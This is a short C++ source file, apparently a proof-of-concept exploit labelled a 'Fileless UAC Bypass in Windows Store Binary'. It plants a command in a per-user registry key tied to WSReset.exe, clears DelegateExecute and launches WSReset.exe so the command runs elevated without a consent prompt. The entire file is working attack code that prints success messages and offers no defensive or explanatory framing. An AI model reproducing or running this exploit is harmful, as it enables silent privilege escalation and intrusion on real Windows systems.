#include <iostream>
#include "windows.h"
#include "stdlib.h"

int main() {
	printf("Fileless UAC Bypass in Windows Store Binary\n");
	
	//if (argc !=2) {
	//	printf("Usage : exploit.exe <cmdToExec>");
	//	ExitProcess(0);
	//}
	
	LPCVOID cmd = "C:\\Windows\\System32\\cmd.exe /c start cmd.exe";
	LPCSTR key = "Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command";
	LPCSTR val1 = "(Default)";
	LPCSTR val2 = "DelegateExecute";
	LPCSTR app = "WSReset.exe";
	if (RegSetKeyValue(HKEY_CURRENT_USER, key, val1, REG_SZ, cmd , MAX_PATH) != ERROR_SUCCESS) {
		printf("[-] Failed to reset value %s",val1);
	}
	else {
		printf("[+] Succcess in Altering Value : %s\n",val1);
		if (RegSetKeyValue(HKEY_CURRENT_USER, key, val2, REG_SZ, "", MAX_PATH) != ERROR_SUCCESS) {
			printf("[-] Failed to reset value %s", val2);
		}
		else {
			printf("[+] Succcess in Altering Value : %s\n", val2);
			printf("[+] Running WSReset.exe\n");
			Sleep(5000);
			if(WinExec(app,0)!=0){
				printf("[!] All set! ready to roll, if %s doesn't starts automatically, do it manually",app);
			}
		}
	}
	return 0;
}